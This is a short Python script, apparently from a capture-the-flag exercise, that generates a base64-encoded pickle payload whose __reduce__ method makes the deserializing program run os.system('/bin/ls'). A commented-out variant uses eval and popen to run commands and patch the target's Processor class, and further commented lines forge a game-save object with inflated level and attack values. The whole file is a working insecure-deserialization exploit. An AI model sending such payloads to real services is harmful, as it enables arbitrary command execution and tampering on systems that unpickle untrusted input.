import pickle
import codecs
import os

class Exploit(object):
  def __reduce__(self):
    #return (eval,('__import__("message").Msg(globals()["sys"].modules["os"].popen("/bin/ls").read(), globals()["sys"].modules["__main__"].__dict__["Processor"].__dict__.__setitem__("process",lambda self,msg:msg.text))',))
    return (os.system,('/bin/ls',))

#data = pickle.dumps(Exploit())
data = codecs.encode(pickle.dumps(Exploit()), "base64").decode()
print(data)


#pickled = 'gAN9cQAoWA4AAABMZXZlbENvbXBsZXRlZHEBSwFYBAAAAE5hbWVxAlgGAAAAV2l6YXJkcQNYBgAAAGhlYWx0aHEETV4BWAYAAABhdHRhY2txBU30AXUu' 

#unpickled = pickle.loads(codecs.decode(pickled.encode(), "base64"))

#object = {'LevelCompleted': 9, 'Name': 'Wizard', 'health': 350, 'attack': 10000}
#pickledobj = codecs.encode(pickle.dumps(object), "base64").decode()
#print(pickledobj)
